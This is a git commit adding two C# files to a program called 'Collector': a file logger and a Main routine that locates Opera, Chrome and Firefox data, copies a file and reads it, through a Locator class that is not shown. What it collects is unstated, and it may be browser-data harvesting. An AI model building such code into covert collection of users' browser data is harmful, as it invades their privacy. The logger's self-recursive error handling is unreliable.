09f6502ef85abaef9a955f83011d23260db58e1c
Robert Balaguer <robert.balaguer@ftpelect.local>
2018-04-18 15:39:11 +0800

    0001

---
+++ LogWriter.cs
@@ -0,0 +1,49 @@
+﻿using System;
+using System.IO;
+using System.Linq;
+using System.Reflection;
+
+namespace Collector
+{
+    public class LogWriter
+    {
+        private string m_exePath = string.Empty;
+        private string mk_dir = "logs\\" + Environment.UserName;
+        public LogWriter(string logMessage)
+        {
+            LogWrite(logMessage);
+        }
+        public void LogWrite(string logMessage)
+        {
+            m_exePath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
+
+            try
+            {
+                Directory.CreateDirectory(mk_dir);
+                using (StreamWriter w = File.AppendText(m_exePath + "\\"+ mk_dir +"\\log.txt"))
+                {
+                    Log(logMessage, w);
+                }
+            }
+            catch (Exception ex)
+            {
+                new LogWriter(ex.Message);
+            }
+        }
+
+        public void Log(string logMessage, TextWriter txtWriter)
+        {
+            try
+            {
+                txtWriter.Write("{0} {1}", DateTime.Now.ToLongTimeString(),
+                    DateTime.Now.ToLongDateString());
+                txtWriter.Write("| :");
+                txtWriter.WriteLine(" {0}", logMessage);
+            }
+            catch (Exception ex)
+            {
+                new LogWriter(ex.Message);
+            }
+        }
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,57 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+
+namespace Collector
+{
+    class Program
+    {
+        static void Main()
+        {
+
+            Locator l = new Locator();
+            l.VariableDirectory();
+            // For Opera
+            try
+            {
+                l.OperaLocator();
+                l.CopyFile();
+                l.Reader();
+            }
+            catch(Exception ex)
+            {
+                new LogWriter(ex.Message);
+            }
+
+            // For Google Chrome
+            try
+            {
+                l.ChromeLocator();
+                l.CopyFile();
+                l.Reader();
+            }
+            catch (Exception ex)
+            {
+                new LogWriter(ex.Message);
+            }
+
+            // For Mozilla Firefox
+            try
+            {
+                l.MozillaLocator();
+                l.CopyFile();
+                l.Reader();
+            }
+            catch (Exception ex)
+            {
+                new LogWriter(ex.Message);
+            }
+
+            Console.ReadLine();
+        }
+    }
+
+} 
